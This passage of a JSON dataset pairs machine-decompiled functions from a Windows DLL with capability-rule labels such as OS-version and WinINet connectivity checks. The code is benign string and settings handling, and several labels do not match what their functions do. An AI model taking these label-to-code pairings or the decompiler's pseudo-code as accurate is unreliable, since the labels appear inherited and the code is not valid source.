uVar1) {\n                bVar9 = uVar1 < uVar2;\n                bVar10 = uVar1 == uVar2;\n                ppuVar5 = ppuVar4;\n                puVar6 = puStack40;\n                do {\n                    if (!bVar9 && !bVar10) break;\n                    if (puVar6 == 0x1) goto code_r0x00018006085e;\n                    uVar1 = *(ppppuVar8 + (2 - ppuVar4) + ppuVar5);\n                    ppuVar5 = ppuVar5 + 2;\n                    puVar6 = puVar6 + -1;\n                    bVar9 = uVar1 < *ppuVar5;\n                    bVar10 = uVar1 == *ppuVar5;\n                } while (!bVar9);\n            }\n        }\n    }\ncode_r0x00018006085e:\n    if (7 < uStack32) {\n        ppppuVar8 = appppuStack56[0];\n        if ((0xfff < uStack32 * 2 + 2) &&\n           (ppppuVar8 = appppuStack56[0][-1],  0x1f < appppuStack56[0] + (-8 - ppppuVar8))) {\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18008fb24(ppppuVar8);\n    }\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 713
    },
    "1800608d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800608d0(int64_t *arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    ulong uVar5;\n    int64_t arg1_00;\n    int64_t *piVar6;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack56 [32];\n    int64_t *piStack24;\n    uint64_t uStack16;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack104;\n    piStack24 = arg2;\n    cVar4 = (**(*arg1 + 0x58))();\n    if (cVar4 != '\\0') {\n        iVar2 = arg2[2];\n        cVar4 = (**(*arg1 + 0x58))(arg1);\n        if (cVar4 != '\\0') {\n            *(arg1 + 199) = iVar2 != 0;\n            uVar5 = (**0x1800de798)(arg1[3], 0x232d);\n            (**0x1800de5b8)(uVar5, 0, 1);\n            uVar5 = (**0x1800de798)(arg1[3], 0x232f);\n            (**0x1800de770)(uVar5, iVar2 != 0);\n        }\n        piVar6 = arg2;\n        uVar5 = fcn.18000de50(auStack56, arg2);\n        fcn.18005fb10(arg1, CONCAT71(piVar6 >> 8, 1), uVar5);\n    }\n    uVar1 = arg2[3];\n    if (0xf < uVar1) {\n        iVar2 = *arg2;\n        arg1_00 = iVar2;\n        if (0xfff < uVar1 + 1) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar2 - arg1_00, uVar1 + 0x28);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg2 = 0;\n    arg2[3] = 0xf;\n    arg2[2] = 0;\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 581
    },
    "1800609f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800609f0(ulong arg1, int64_t *arg2, int64_t *arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uchar *arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong var_fh;\n    ulong var_17h;\n    ulong var_1fh;\n    ulong var_27h;\n    ulong var_2fh;\n    ulong var_37h;\n    uchar auStack248 [32];\n    uchar *puStack216;\n    uchar *puStack208;\n    uchar *puStack200;\n    uchar uStack192;\n    unkbyte7 Stack191;\n    ulong uStack176;\n    uint64_t uStack168;\n    uchar uStack160;\n    unkbyte7 Stack159;\n    ulong uStack144;\n    uint64_t uStack136;\n    uchar auStack128 [15];\n    ulong var_69h;\n    ulong var_61h;\n    uchar uStack96;\n    uchar auStack95 [6];\n    ulong var_51h;\n    ulong var_49h;\n    ulong var_41h;\n    uchar auStack64 [7];\n    int64_t *var_31h;\n    int64_t *var_29h;\n    uint64_t var_21h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    _auStack64 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack248;\n    unique0x10000334 = arg2;\n    unique0x1000034c = arg3;\n    if ((arg2[2] == 0) && (arg3[2] != 0)) {\n        puStack200 = auStack128;\n        stack0xffffffffffffff90 = 0;\n        stack0xffffffffffffff98 = 0xf;\n        auStack128[0] = 0;\n        fcn.180011120(auStack128, 0x1800f4b99, 0);\n        var_49h._1_4_ = *0x180101910;\n        stack0xffffffffffffffb4 = *0x180101914;\n        var_41h._1_4_ = *0x180101918;\n        stack0xffffffffffffffbc = *0x18010191c;\n        uStack96 = 0;\n        fcn.180011120(&uStack96, 0x1800f4b9b, 0);\n        uStack176 = CONCAT44(*0x180101914, *0x180101910);\n        uStack168 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack192 = 0;\n        arg1_00 = &uStack192;\n        fcn.180011120(arg1_00, \"FileTheme\", 9);\n        puStack208 = auStack128;\n        puStack216 = &uStack96;\n        uVar3 = fcn.180004b90(arg1_00, &uStack160, arg3, &uStack192);\n        fcn.18000dd60(arg2, uVar3);\n        if (0xf < uStack136) {\n            iVar5 = CONCAT71(Stack159, uStack160);\n            iVar4 = iVar5;\n            if ((uStack136 + 1 < 0x1000) || (iVar4 = *(iVar5 + -8),  (iVar5 - iVar4) - 8U < 0x20)) {\n                fcn.18008fb24(iVar4);\n                goto code_r0x000180060b2a;\n            }\n            goto code_r0x000180060c9d;\n        }\ncode_r0x000180060b2a:\n        uStack144 = CONCAT44(*0x180101914, *0x180101910);\n        uStack136 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack160 = 0;\n        if (uStack168 < 0x10) {\ncode_r0x000180060b76:\n            uStack176 = CONCAT44(*0x180101914, *0x180101910);\n            uStack168 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack192 = 0;\n            if (0xf < CONCAT44(stack0xffffffffffffffbc, var_41h._1_4_)) {\n                iVar5 = CONCAT71(_auStack95, uStack96);\n                iVar4 = iVar5;\n                if ((0xfff < CONCAT44(stack0xffffffffffffffbc, var_41h._1_4_) + 1) &&\n                   (iVar4 = *(iVar5 + -8),  0x1f < (iVar5 - iVar4) - 8U)) goto code_r0x000180060ca9;\n                fcn.18008fb24(iVar4);\n            }\n            goto code_r0x000180060bc2;\n        }\n        iVar5 = CONCAT71(Stack191, uStack192);\n        iVar4 = iVar5;\n        if ((uStack168 + 1 < 0x1000) || (iVar4 = *(iVar5 + -8),  (iVar5 - iVar4) - 8U < 0x20)) {\n            fcn.18008fb24(iVar4);\n            goto code_r0x000180060b76;\n        }\n    }\n    else {\ncode_r0x000180060bc2:\n        uVar3 = fcn.18000de50(&uStack160, arg2);\n        fcn.18005fb10(arg1, 0, uVar3);\n        uVar1 = arg2[3];\n        if (uVar1 < 0x10) {\ncode_r0x000180060c16:\n            arg2[2] = 0;\n            arg2[3] = 0xf;\n            *arg2 = 0;\n            if (arg3[3] < 0x10) {\ncode_r0x000180060c5f:\n                arg3[2] = 0;\n                arg3[3] = 0xf;\n                *arg3 = 0;\n                fcn.18008fb00(stack0xffffffffffffffd8 ^ auStack248);\n                return;\n            }\n            iVar4 = *arg3;\n            iVar5 = iVar4;\n            if ((arg3[3] + 1U < 0x1000) || (iVar5 = *(iVar4 + -8),  (iVar4 - iVar5) - 8U < 0x20)) {\n                fcn.18008fb24(iVar5);\n                goto code_r0x000180060c5f;\n            }\n        }\n        else {\n            iVar4 = *arg2;\n            iVar5 = iVar4;\n            if (uVar1 + 1 < 0x1000) {\ncode_r0x000180060c11:\n                fcn.18008fb24(iVar5);\n                goto code_r0x000180060c16;\n            }\n            iVar5 = *(iVar4 + -8);\n            if ((iVar4 - iVar5) - 8U < 0x20) goto code_r0x000180060c11;\n            fcn.1800b3528(iVar4 - iVar5, uVar1 + 0x28);\n        }\n        fcn.1800b3528();\ncode_r0x000180060c9d:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180060ca9:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1773
    },
    "180060cb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180060cb0(int64_t arg1, uint16_t **arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    code *pcVar4;\n    uint16_t **ppuVar5;\n    uint16_t *puVar6;\n    uint16_t *arg1_00;\n    ulong ****ppppuVar7;\n    uint16_t **ppuVar8;\n    ulong ****ppppuVar9;\n    int64_t iVar10;\n    bool bVar11;\n    bool bVar12;\n    uchar auStack120 [32];\n    ulong uStack88;\n    uint16_t **ppuStack80;\n    ulong ****appppuStack72 [2];\n    uint16_t *puStack56;\n    uint64_t uStack48;\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack120;\n    ppuStack80 = arg2;\n    fcn.18005f9c0(arg1, appppuStack72);\n    for (ppuVar8 = *(arg1 + 0x108); ppppuVar7 = appppuStack72[0],  ppuVar8 != *(arg1 + 0x110); ppuVar8 = ppuVar8 + 0x11)\n    {\n        ppuVar5 = ppuVar8;\n        if (0x7 < ppuVar8[3]) {\n            ppuVar5 = *ppuVar8;\n        }\n        ppppuVar9 = appppuStack72;\n        if (7 < uStack48) {\n            ppppuVar9 = appppuStack72[0];\n        }\n        if (puStack56 == ppuVar8[2]) {\n            if (puStack56 == NULL) {\ncode_r0x000180060db0:\n                if (ppuVar8 + 0xc != arg2) {\n                    ppuVar5 = arg2;\n                    if (0xf < arg2[3]) {\n                        ppuVar5 = *arg2;\n                    }\n                    fcn.180011120(ppuVar8 + 0xc, ppuVar5, arg2[2]);\n                }\n                if (uStack48 < 8) goto code_r0x000180060e08;\n                if ((uStack48 * 2 + 2 < 0x1000) ||\n                   (ppppuVar7 = appppuStack72[0][-1],  appppuStack72[0] + (-8 - ppppuVar7) < 0x20))\n                goto code_r0x000180060dff;\n                goto code_r0x000180060e74;\n            }\n            uVar1 = *ppppuVar9;\n            uVar2 = *ppuVar5;\n            if (uVar2 <= uVar1) {\n                iVar10 = ppppuVar9 - ppuVar5;\n                bVar11 = uVar1 < uVar2;\n                bVar12 = uVar1 == uVar2;\n                puVar6 = puStack56;\n                do {\n                    if (!bVar11 && !bVar12) break;\n                    if (puVar6 == 0x1) goto code_r0x000180060db0;\n                    puVar6 = puVar6 + -1;\n                    ppuVar5 = ppuVar5 + 2;\n                    uVar1 = *(iVar10 + ppuVar5);\n                    bVar11 = uVar1 < *ppuVar5;\n                    bVar12 = uVar1 == *ppuVar5;\n                } while (!bVar11);\n            }\n        }\n    }\n    if (7 < uStack48) {\n        if ((0xfff < uStack48 * 2 + 2) &&\n           (ppppuVar7 = appppuStack72[0][-1],  0x1f < appppuStack72[0] + (-8 - ppppuVar7))) goto code_r0x000180060e74;\ncode_r0x000180060dff:\n        fcn.18008fb24(ppppuVar7);\n    }\ncode_r0x000180060e08:\n    puVar6 = arg2[3];\n    if (0xf < puVar6) {\n        puVar3 = *arg2;\n        arg1_00 = puVar3;\n        if (0xfff < puVar6 + 1U) {\n            arg1_00 = *(puVar3 + -4);\n            if (0x1f < (puVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(puVar3 - arg1_00, puVar6 + 0x14);\ncode_r0x000180060e74:\n                fcn.1800b3528();\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg2 = 0;\n    arg2[3] = 0xf;\n    arg2[2] = NULL;\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 1163
    },
    "180060e8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180060e80(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint16_t **ppuVar4;\n    uint16_t **ppuVar5;\n    uint16_t *puVar6;\n    uchar in_DL;\n    uint16_t **ppuVar7;\n    ulong *****pppppuVar8;\n    bool bVar9;\n    bool bVar10;\n    uchar auStack88 [32];\n    ulong *****apppppuStack56 [2];\n    uint16_t *puStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack88;\n    fcn.18005f9c0(arg1, apppppuStack56);\n    ppuVar7 = *(arg1 + 0x108);\n    do {\n        if (ppuVar7 == *(arg1 + 0x110)) {\ncode_r0x000180060f46:\n            if (7 < uStack32) {\n                pppppuVar8 = apppppuStack56[0];\n                if ((0xfff < uStack32 * 2 + 2) &&\n                   (pppppuVar8 = apppppuStack56[0][-1],  0x1f < apppppuStack56[0] + (-8 - pppppuVar8))) {\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                fcn.18008fb24(pppppuVar8);\n            }\n            fcn.18008fb00(uStack24 ^ auStack88);\n            return;\n        }\n        ppuVar4 = ppuVar7;\n        if (0x7 < ppuVar7[3]) {\n            ppuVar4 = *ppuVar7;\n        }\n        pppppuVar8 = apppppuStack56;\n        if (7 < uStack32) {\n            pppppuVar8 = apppppuStack56[0];\n        }\n        if (puStack40 == ppuVar7[2]) {\n            if (puStack40 == NULL) {\ncode_r0x000180060f3f:\n                *(ppuVar7 + 0x10) = in_DL;\n                goto code_r0x000180060f46;\n            }\n            uVar1 = *pppppuVar8;\n            uVar2 = *ppuVar4;\n            if (uVar2 <= uVar1) {\n                bVar9 = uVar1 < uVar2;\n                bVar10 = uVar1 == uVar2;\n                ppuVar5 = ppuVar4;\n                puVar6 = puStack40;\n                do {\n                    if (!bVar9 && !bVar10) break;\n                    if (puVar6 == 0x1) goto code_r0x000180060f3f;\n                    uVar1 = *(pppppuVar8 + (2 - ppuVar4) + ppuVar5);\n                    ppuVar5 = ppuVar5 + 2;\n                    puVar6 = puVar6 + -1;\n                    bVar9 = uVar1 < *ppuVar5;\n                    bVar10 = uVar1 == *ppuVar5;\n                } while (!bVar9);\n            }\n        }\n        ppuVar7 = ppuVar7 + 0x11;\n    } while( true );\n}\n",
        "token_count": 774
    },
    "180060fb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180060fb0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uchar *arg1_00;\n    ulong unaff_RBX;\n    ulong unaff_RDI;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    ulong in_stack_000000a0;\n    ulong in_stack_000000a8;\n    ulong in_stack_000000b0;\n    ulong in_stack_000000b8;\n    ulong in_stack_000000c0;\n    ulong in_stack_000000c8;\n    unkbyte7 in_stack_ffffffffffffffc9;\n    ulong in_stack_ffffffffffffffd0;\n    uchar uVar2;\n    unkbyte7 in_stack_ffffffffffffffd9;\n    ulong in_stack_ffffffffffffffe0;\n    ulong noname_8;\n    ulong noname_9;\n    \n    iVar1 = (**0x1800de740)(*(arg1 + 0x18), 0x235b);\n    arg1_00 = &stack0xffffffffffffffd8;\n    fcn.180011120(arg1_00, \"AutoDetectFileType\", 0x12);\n    fcn.180007fb0(arg1_00, &stack0xffffffffffffffd8);\n    if (iVar1 == 1) {\n        noname_8 = 0;\n        noname_9 = 0xf;\n        uVar2 = 0;\n        fcn.180011120(&stack0xffffffffffffffd8, 0x1800f4bae, 0);\n        fcn.1800562f0(arg1, &stack0xffffffffffffffd8, 0, 1, CONCAT71(in_stack_ffffffffffffffc9, 1), \n                      in_stack_ffffffffffffffd0, CONCAT71(in_stack_ffffffffffffffd9, uVar2), in_stack_ffffffffffffffe0, \n                      noname_8, noname_9, unaff_RDI, in_stack_00000000, in_stack_00000008, unaff_RBX, in_stack_00000018\n                      , in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                      in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                      in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088, in_stack_00000090, \n                      in_stack_00000098, in_stack_000000a0, in_stack_000000a8, in_stack_000000b0, in_stack_000000b8, \n                      in_stack_000000c0, in_stack_000000c8);\n    }\n    return;\n}\n",
        "token_count": 780
    },
    "1800614a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800614a0(ulong arg1, uchar *arg2, int64_t **arg3)\n\n{\n    int64_t **ppiVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    uchar *arg1_00;\n    uint64_t uVar10;\n    int64_t *arg1_01;\n    uchar **arg1_02;\n    uint64_t uVar11;\n    int64_t **arg2_00;\n    uint64_t uVar12;\n    uint64_t *puVar13;\n    int64_t iVar14;\n    ulong var_8h;\n    ulong var_10h;\n    uchar auStack344 [32];\n    ushort *puStack312;\n    uchar *puStack296;\n    uint uStack288;\n    uint uStack284;\n    uint64_t uStack280;\n    uint64_t uStack272;\n    uint32_t uStack264;\n    uchar *puStack256;\n    ulong uStack248;\n    ushort auStack232 [8];\n    ulong uStack216;\n    ulong uStack208;\n    uchar auStack200 [16];\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ushort *puStack160;\n    uchar *puStack152;\n    int64_t iStack144;\n    ulong var_80h;\n    ulong var_78h;\n    uint64_t var_bp_70h;\n    int64_t **ppiStack112;\n    ulong var_bp_60h;\n    ulong var_bp_58h;\n    uint64_t var_50h;\n    uint64_t var_bp_48h;\n    uint64_t var_bp_40h;\n    ulong var_38h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h_2;\n    \n    uStack168 = 0xfffffffffffffffe;\n    var_bp_40h = *0x180123080 ^ auStack344;\n    arg1_00 = NULL;\n    puStack256 = arg2;\n    uStack248 = arg1;\n    ppiStack112 = arg3;\n    if (arg3[2] == NULL) {\n        *(arg2 + 0x10) = 0;\n        *(arg2 + 0x18) = 0xf;\n        *arg2 = 0;\n        fcn.180011120(arg2, 0x1800f4c0a, 0);\n        if (arg3[3] < 0x10) goto code_r0x000180061552;\n        arg1_01 = *arg3;\n        if (0xfff < arg3[3] + 1U) {\n            uVar10 = arg1_01 + (-8 - arg1_01[-1]);\n            arg1_01 = arg1_01[-1];\njoined_r0x0001800619b4:\n            if (0x1f < uVar10) {\ncode_r0x0001800619ca:\n                fcn.1800b3528();\ncode_r0x0001800619d0:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n    }\n    else {\n        uStack280 = 0;\n        uStack272 = 7;\n        puStack296 = puStack296 & 0xffffffffffff0000;\n        arg1_02 = &puStack296;\n        fcn.180010d70(arg1_02, 0x1800f9fdc, 0);\n        uVar5 = fcn.1800062e0(arg1_02, &puStack296);\n        puStack256 = puStack256 & 0xffffffff00000000 | uVar5;\n        var_50h = 0;\n        var_bp_48h = 0xf;\n        var_bp_60h._0_1_ = 0;\n        fcn.180010fa0(&var_bp_60h, 6);\n        if (0 < uVar5) {\n            iVar14 = -1;\n            puVar7 = arg1_00;\ncode_r0x000180061600:\n            puVar8 = &var_bp_60h;\n            if (0xf < var_bp_48h) {\n                puVar8 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n            }\n            uStack264 = puVar7 + 1;\n            fcn.180020af0(puVar8, 6, \"FS%03d\", uStack264);\n            puStack160 = auStack232;\n            uStack216 = 0;\n            uStack208 = 7;\n            auStack232[0] = 0;\n            fcn.180010d70(auStack232, 0x1800fa024, 0);\n            puStack152 = auStack200;\n            uStack184 = 0;\n            uStack176 = 0xf;\n            auStack200[0] = 0;\n            puVar7 = auStack200;\n            fcn.180011120(puVar7, \"FileType\", 8);\n            uVar10 = var_50h;\n            uStack280 = 0;\n            uStack272 = 0;\n            puVar13 = &var_bp_60h;\n            if (0xf < var_bp_48h) {\n                puVar13 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n            }\n            if (var_50h < 0x10) {\n                puStack296 = *puVar13;\n                uStack288 = *(puVar13 + 1);\n                uStack284 = *(puVar13 + 0xc);\n                uStack272 = 0xf;\n            }\n            else {\n                uVar12 = var_50h | 0xf;\n                if (0x7fffffffffffffff < uVar12) {\n                    uVar12 = 0x7fffffffffffffff;\n                }\n                uVar2 = uVar12 + 1;\n                if (uVar2 < 0x1000) {\n                    puVar7 = arg1_00;\n                    if (uVar2 != 0) {\n                        puVar7 = fcn.18008fb2c(uVar2);\n                    }\n                }\n                else {\n                    uVar11 = uVar12 + 0x28;\n                    if (uVar11 <= uVar2) {\n                        uVar11 = 0xffffffffffffffff;\n                    }\n                    iVar9 = fcn.18008fb2c(uVar11);\n                    if (iVar9 == 0) goto code_r0x0001800619d0;\n                    puVar7 = iVar9 + 0x27U & 0xffffffffffffffe0;\n                    *(puVar7 + -8) = iVar9;\n                }\n                puStack296 = puVar7;\n                fcn.1800ade80(puVar7, puVar13, uVar10 + 1);\n                uStack272 = uVar12;\n            }\n            uStack280 = uVar10;\n            puStack312 = auStack232;\n            puVar8 = fcn.1800065d0(puVar7, &iStack144, &puStack296, auStack200);\n            arg2_00 = arg3;\n            if (0xf < arg3[3]) {\n                arg2_00 = *arg3;\n            }\n            ppiVar1 = puVar8 + 2;\n            if (0xf < puVar8[3]) {\n                puVar8 = *puVar8;\n            }\n            if ((*ppiVar1 == arg3[2]) && (iVar6 = fcn.1800ae4d0(puVar8, arg2_00, *ppiVar1),  iVar6 == 0)) {\n                bVar4 = true;\n            }\n            else {\n                bVar4 = false;\n            }\n            if (0xf < var_bp_70h) {\n                iVar9 = iStack144;\n                if ((0xfff < var_bp_70h + 1) && (iVar9 = *(iStack144 + -8),  0x1f < (iStack144 - iVar9) - 8U))\n                goto code_r0x0001800619d0;\n                fcn.18008fb24(iVar9);\n            }\n            uVar10 = var_50h;\n            if (!bVar4) goto code_r0x0001800617cc;\n            uStack280 = 0;\n            uStack272 = 0;\n            puVar13 = &var_bp_60h;\n            if (0xf < var_bp_48h) {\n                puVar13 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n            }\n            if (var_50h < 0x10) {\n                puStack296 = *puVar13;\n                uStack288 = *(puVar13 + 1);\n                uStack284 = *(puVar13 + 0xc);\n                uVar12 = 0xf;\n            }\n            else {\n                uVar12 = var_50h | 0xf;\n                if (0x7fffffffffffffff < uVar12) {\n                    uVar12 = 0x7fffffffffffffff;\n                }\n                uVar2 = uVar12 + 1;\n                if (uVar2 < 0x1000) {\n                    if (uVar2 != 0) {\n                        arg1_00 = fcn.18008fb2c(uVar2);\n                    }\n                }\n                else {\n                    uVar11 = uVar12 + 0x28;\n                    if (uVar11 <= uVar2) {\n                        uVar11 = 0xffffffffffffffff;\n                    }\n                    iVar9 = fcn.18008fb2c(uVar11);\n                    if (iVar9 == 0) {\n                        fcn.1800b3528();\n                        goto code_r0x0001800619c4;\n                    }\n                    arg1_00 = iVar9 + 0x27U & 0xffffffffffffffe0;\n                    *(arg1_00 + -8) = iVar9;\n                }\n                puStack296 = arg1_00;\n                fcn.1800ade80(arg1_00, puVar13, uVar10 + 1);\n            }\n            uStack280 = uVar10;\n            uStack272 = uVar12;\n            fcn.180060cb0(uStack248, &puStack296);\n            puVar8 = &var_bp_60h;\n            if (0xf < var_bp_48h) {\n                puVar8 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n            }\n            *(arg2 + 0x10) = 0;\n            *(arg2 + 0x18) = 0xf;\n            *arg2 = 0;\n            do {\n                iVar14 = iVar14 + 1;\n            } while (*(puVar8 + iVar14) != '\\0');\n            fcn.180011120(arg2, puVar8, iVar14);\n            if (0xf < var_bp_48h) {\n                iVar14 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n                if (0xfff < var_bp_48h + 1) {\n                    iVar9 = iVar14 - *(iVar14 + -8);\n                    iVar14 = *(iVar14 + -8);\n                    goto joined_r0x000180061969;\n                }\n                goto code_r0x00018006196b;\n            }\n            goto code_r0x000180061970;\n        }\ncode_r0x0001800617da:\n        *(arg2 + 0x10) = 0;\n        *(arg2 + 0x18) = 0xf;\n        *arg2 = 0;\n        fcn.180011120(arg2, 0x1800f4c0b, 0);\n        if (0xf < var_bp_48h) {\n            iVar14 = CONCAT71(var_bp_60h._1_7_, var_bp_60h);\n            if (0xfff < var_bp_48h + 1) {\n                iVar9 = iVar14 - *(iVar14 + -8);\n                iVar14 = *(iVar14 + -8);\njoined_r0x000180061969:\n                if (0x1f < iVar9 - 8U) {\ncode_r0x0001800619c4:\n                    fcn.1800b3528();\n                    goto code_r0x0001800619ca;\n                }\n            }\ncode_r0x00018006196b:\n            fcn.18008fb24(iVar14);\n        }\ncode_r0x000180061970:\n        var_50h = 0;\n        var_bp_48h = 0xf;\n        var_bp_60h._0_1_ = 0;\n        if (arg3[3] < 0x10) goto code_r0x000180061552;\n        arg1_01 = *arg3;\n        if (0xfff < arg3[3] + 1U) {\n            uVar10 = arg1_01 + (-8 - arg1_01[-1]);\n            arg1_01 = arg1_01[-1];\n            goto joined_r0x0001800619b4;\n        }\n    }\n    fcn.18008fb24(arg1_01);\ncode_r0x000180061552:\n    *arg3 = 0;\n    arg3[3] = 0xf;\n    arg3[2] = NULL;\n    fcn.18008fb00(var_bp_40h ^ auStack344);\n    return;\ncode_r0x0001800617cc:\n    puVar7 = uStack264;\n    if (puStack256 <= uStack264) goto code_r0x0001800617da;\n    goto code_r0x000180061600;\n}\n",
        "token_count": 3126
    },
    "180066df": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180066df0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t arg2;\n    int64_t iVar9;\n    int64_t iVar10;\n    ushort in_DX;\n    int64_t *piVar11;\n    ushort *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    char in_R8B;\n    char in_R9B;\n    uint64_t uVar15;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack248 [32];\n    int64_t *piStack216;\n    uint uStack208;\n    ulong uStack200;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    ulong uStack152;\n    int64_t iStack144;\n    ushort uStack136;\n    ushort uStack134;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    ushort uStack104;\n    uchar auStack102 [5];\n    ulong var_59h;\n    uchar auStack88 [7];\n    ulong var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    \n    uStack152 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack248;\n    iVar9 = 0;\n    piStack216 = arg1;\n    if (in_R8B == 